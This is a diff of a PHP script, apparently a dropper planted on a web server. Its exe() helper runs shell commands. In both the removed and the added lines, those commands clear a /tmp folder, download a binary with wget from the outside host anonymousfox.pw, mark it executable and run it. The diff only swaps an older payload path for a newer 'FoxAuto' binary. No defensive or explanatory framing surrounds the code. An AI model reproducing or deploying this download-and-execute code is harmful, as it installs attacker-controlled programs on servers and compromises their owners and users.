@@ -25,8 +25,8 @@ function exe($in) {
         return $out;
 }
 
-exe("rm -rf /tmp/service.hosting");
-exe("wget http://anonymousfox.pw/local/wso/ri686");
-exe("chmod +x ri686");
-exe("./ri686 0");
+exe("rm -rf /tmp/FoxAuto");
+exe("wget https://anonymousfox.pw/local/FoxAuto/FoxAuto-i686");
+exe("chmod +x FoxAuto-i686");
+exe("./FoxAuto-i686 0");
 ?>
